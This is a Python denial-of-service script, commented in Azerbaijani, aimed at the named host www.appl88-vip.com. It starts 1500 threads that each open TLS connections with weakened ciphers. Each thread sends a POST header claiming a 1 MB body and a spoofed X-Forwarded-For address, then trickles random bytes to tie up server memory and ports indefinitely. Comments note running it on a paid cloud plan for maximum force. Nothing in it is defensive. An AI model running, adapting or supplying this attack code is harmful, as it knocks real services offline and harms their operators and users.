import socket
import ssl
import threading
import random
import string
import time
import os

# --- EXTREME SETTINGS ---
TARGET_HOST = "www.appl88-vip.com"
TARGET_PORT = 443
THREADS = 1500 # Railway Paid plan üçün maksimal güc
PAYLOAD_SIZE = 1048576 # 1 MB-lıq "yalançı" yük hər bağlantı üçün

def r_str(n):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

def attack():
    # SSL Handshake-i serveri ən çox yoran şəkildə qururuq
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_ciphers('ALL:@SECLEVEL=0') 

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1) # Nagle bypass
            s.settimeout(10)

            conn = ctx.wrap_socket(s, server_hostname=TARGET_HOST)
            conn.connect((TARGET_HOST, TARGET_PORT))

            # Serveri "gözləmə" rejiminə salan çox ağır POST header-i
            # Content-Length-i süni şəkildə çox böyük göstəririk
            forwarded_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,254)}"
            
            header = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {TARGET_HOST}\r\n"
                f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {PAYLOAD_SIZE}\r\n" # Server bu 1 MB-ın gəlməsini GÖZLƏYƏCƏK
                f"X-Forwarded-For: {forwarded_ip}\r\n"
                f"X-Requested-With: XMLHttpRequest\r\n"
                f"Connection: Keep-Alive\r\n"
                f"\r\n"
            ).encode()

            conn.sendall(header)

            # İndi serveri "asılı" vəziyyətdə saxlayırıq
            # Hər saniyə cəmi 1-2 bayt göndərərək bağlantının qırılmasına imkan vermirik
            for _ in range(100):
                conn.send(os.urandom(random.randint(1, 4)))
                time.sleep(random.uniform(0.1, 0.5))

            conn.close()
        except:
            pass

def main():
    print(f"☢️  DOOMSDAY PROTOCOL ACTIVATED: {TARGET_HOST}")
    print(f"[*] Targeting RAM and Port Exhaustion with {THREADS} threads.")
    
    for i in range(THREADS):
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()
        if i % 100 == 0:
            print(f"[*] {i} Warheads armed...")
            time.sleep(0.1)

    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
